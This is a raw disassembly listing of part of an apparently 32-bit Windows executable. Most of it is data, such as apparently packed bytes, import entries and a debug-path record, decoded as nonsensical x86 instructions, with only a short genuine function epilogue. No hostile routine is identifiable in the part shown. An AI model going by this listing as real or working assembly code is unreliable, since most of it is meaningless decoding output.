  413abd:	mov    fs,WORD PTR [ebx+edx*1-0x3ffbd814]
  413ac4:	xchg   DWORD PTR [ebx-0x49514414],esi
  413aca:	jg     0x413ada
  413acc:	je     0x413abe
  413ace:	addr16 xchg bh,ch
  413ad1:	imul   edi,DWORD PTR [ecx],0x885542f3
  413ad7:	mov    esp,DWORD PTR [ecx-0x9f622eb]
  413add:	enter  0x55a,0xd0
  413ae1:	sub    eax,0x7743ba43
  413ae6:	or     BYTE PTR [ebx+ebp*8],dh
  413ae9:	xchg   ebp,eax
  413aea:	dec    eax
  413aeb:	js     0x413b1e
  413aed:	pop    es
  413aee:	lods   al,BYTE PTR ds:[esi]
  413aef:	xchg   edx,eax
  413af0:	loop   0x413a98
  413af2:	push   ecx
  413af3:	les    ebp,FWORD PTR [edi-0x2608ca95]
  413af9:	fisub  DWORD PTR [ebx+ecx*4-0x13]
  413afd:	cdq    
  413afe:	inc    edx
  413aff:	xchg   edx,eax
  413b00:	rol    BYTE PTR ds:0xe2f1236e,0x33
  413b07:	mov    BYTE PTR [eax-0x63],ch
  413b0a:	sbb    al,0x8a
  413b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b0d:	cmc    
  413b0e:	and    BYTE PTR [ebx-0x51483465],bl
  413b14:	or     esi,DWORD PTR [ebx+ecx*8-0x77669eb2]
  413b1b:	fld    TBYTE PTR [esi]
  413b1d:	lahf   
  413b1e:	cmp    DWORD PTR [ebp-0x64],edi
  413b21:	bound  edi,QWORD PTR [ebx+0x2462e780]
  413b27:	jle    0x413b23
  413b29:	lods   al,BYTE PTR ds:[esi]
  413b2a:	inc    edi
  413b2b:	cmp    al,0xc5
  413b2d:	and    BYTE PTR [edi-0x76],0x17
  413b31:	adc    edx,DWORD PTR [eax]
  413b33:	add    al,0x9b
  413b35:	push   edi
  413b36:	popf   
  413b37:	aaa    
  413b38:	add    eax,0x5e2039fc
  413b3d:	pop    esi
  413b3e:	lahf   
  413b3f:	ret    
  413b40:	xchg   ecx,eax
  413b41:	add    al,0x9a
  413b43:	repz loopne 0x413b33
  413b46:	jecxz  0x413bb1
  413b48:	dec    ecx
  413b49:	or     eax,DWORD PTR [eax-0x3808f06a]
  413b4f:	addr16 loop 0x413b5a
  413b52:	repz jp 0x413b62
  413b55:	ret    
  413b56:	or     BYTE PTR [ecx-0x4e],ah
  413b59:	adc    eax,ecx
  413b5b:	shl    DWORD PTR [ecx+0x21],cl
  413b5e:	bound  eax,QWORD PTR [edi]
  413b60:	fyl2xp1 
  413b62:	add    al,0x5d
  413b64:	shl    DWORD PTR [edi+0x558d649b],0xe8
  413b6b:	repnz and al,0x9a
  413b6e:	push   ds
  413b6f:	pop    ecx
  413b70:	lods   al,BYTE PTR ds:[esi]
  413b71:	push   ds
  413b72:	inc    edi
  413b73:	fsub   DWORD PTR [ecx]
  413b75:	ficomp DWORD PTR [ebx]
  413b77:	fwait
  413b78:	mov    ebp,ebp
  413b7a:	jg     0x413b79
  413b7c:	and    DWORD PTR ds:0x8dabe07f,ebp
  413b82:	jo     0x413b71
  413b84:	pusha  
  413b85:	inc    ebp
  413b86:	ins    DWORD PTR es:[edi],dx
  413b87:	fsubr  QWORD PTR [edx+0x4d8ebdfe]
  413b8d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8f:	add    BYTE PTR [eax],bh
  413b91:	sub    al,0x51
  413b93:	mov    bl,0x36
  413b95:	imul   eax,DWORD PTR [eax],0x37
  413b98:	add    al,al
  413b9a:	pop    edi
  413b9b:	push   ebx
  413b9c:	mov    edx,0x363f4596
  413ba1:	fwait
  413ba2:	mov    ss,WORD PTR [edx+0x22f9442d]
  413ba8:	xchg   ecx,eax
  413ba9:	adc    al,0x3b
  413bab:	mov    bl,0x86
  413bad:	cmp    al,0xae
  413baf:	push   esi
  413bb0:	ror    DWORD PTR [edi],0x29
  413bb3:	aam    0x3f
  413bb5:	rcl    BYTE PTR [ecx+0x53],cl
  413bb8:	pop    ebx
  413bb9:	and    BYTE PTR [eax+0x6d14170f],dl
  413bbf:	in     al,dx
  413bc0:	mov    ds:0x87a9eac7,eax
  413bc5:	rcl    BYTE PTR [eax+ebx*2-0x6d],0xd2
  413bca:	add    DWORD PTR [ebx],edi
  413bcc:	xor    dl,dh
  413bce:	ins    BYTE PTR es:[edi],dx
  413bcf:	jns    0x413bed
  413bd1:	xchg   ebp,eax
  413bd2:	cmp    ebx,DWORD PTR [eax+0x7a867d60]
  413bd8:	jl     0x413b99
  413bda:	shl    DWORD PTR [ecx+0x403d7611],cl
  413be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be1:	xchg   esp,eax
  413be2:	mov    ecx,DWORD PTR cs:[ebp-0x8]
  413be6:	xor    ecx,eax
  413be8:	mov    eax,DWORD PTR [ebp+0x10]
  413beb:	add    ecx,esi
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
  413c20:	adc    BYTE PTR [eax],al
  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	fwait
  413d45:	cmc    
  413d46:	dec    edx
  413d47:	sbb    DWORD PTR [edx-0x79b7dcd4],edi
  413d4d:	jp     0x413d6b
  413d4f:	push   ebx
  413d50:	clc    
  413d51:	mov    ah,0x70
  413d53:	or     al,BYTE PTR [ecx]
  413d55:	add    BYTE PTR [eax],al
  413d57:	add    BYTE PTR [ebp+0x3a],al
  413d5a:	pop    esp
  413d5b:	dec    ecx
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
